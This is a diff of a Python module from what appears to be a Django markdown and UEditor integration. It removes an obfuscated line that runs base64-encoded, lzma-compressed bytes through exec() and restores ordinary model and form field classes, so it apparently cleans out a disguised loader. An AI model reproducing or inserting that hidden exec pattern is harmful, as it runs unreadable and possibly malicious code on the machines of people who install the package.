@@ -1,2 +1,58 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AY+AYddADMciiJvqkQ2RKZQgogQPx3LXjQPWUpZIp9OR5NJwrMhCEywb/cYOOiUgaAXQ8sZmQniT9lpbEWzX/00wcO0E6vsOeDYeHICwSy+OeSC1tnFgsyl/ds+zXvYQaYovJ1mskru62JBTdfOLns3RbqyNm1maxoPlq3uYFH91PkMSHkhG3Nov9Ctri+LFV+NGncXqjHb14WzozdurGcHoloPZITy1fKqJDPDfUO4d4zLTUQ0Vz+Pkbg+f39imXDur8bXBc9SphY+jh4GAXz61dm5khub6rrIHY6/m4zmxZlTS4Ye/4Dud0YQ/R+RRZOlomYuxs+/8zYft45Bbo499tjf0aTp1u6RZhY37b6L82nn654fSSCHilsWgtRl4F+TNxY7hRspnSCqtDZ5Ca8D65Y6Mg+xlmxMb16l+rrhg5vpRiVN/FA81JLiJ0fsB62r4OokOPV3Rc3p5aOjvz7DNGVB2BIVIMfV8TcQAL0HJnXMOtv75e47EkTSuDdYm49egb3sXx7EqoGZPwAAAPfq6HQ89DlaAAGjA78MAADlanZXscRn+wIAAAAABFla')))
+from __future__ import absolute_import
+
+from django import forms
+from django.db import models
+
+from .widgets import MDEditorWidget, UEditorWidget
+
+
+class MDTextField(models.TextField):
+    """ custom model field """
+
+    def __init__(self, *args, **kwargs):
+        self.config_name = kwargs.pop("config_name", "default")
+        super(MDTextField, self).__init__(*args, **kwargs)
+
+    def formfield(self, **kwargs):
+        defaults = {
+            'form_class': MDTextFormField,
+            'config_name': self.config_name
+        }
+        defaults.update(kwargs)
+        return super(MDTextField, self).formfield(**defaults)
+
+
+class MDTextFormField(forms.fields.CharField):
+    """ custom form field """
+
+    def __init__(self, config_name='default', *args, **kwargs):
+        kwargs.update({
+            'widget': MDEditorWidget(config_name=config_name)
+        })
+        super(MDTextFormField, self).__init__(*args, **kwargs)
+
+
+class UETextField(models.TextField):
+    """ custom model field """
+
+    def __init__(self, *args, **kwargs):
+        super(UETextField, self).__init__(*args, **kwargs)
+
+    def formfield(self, **kwargs):
+        defaults = {
+            'form_class': UETextFormField,
+        }
+        defaults.update(kwargs)
+        return super(UETextField, self).formfield(**defaults)
+
+
+class UETextFormField(forms.fields.CharField):
+    """ custom form field """
+
+    def __init__(self, config_name='default', *args, **kwargs):
+        kwargs.update({
+            'widget': UEditorWidget()
+        })
+        super(UETextFormField, self).__init__(*args, **kwargs)
+
+
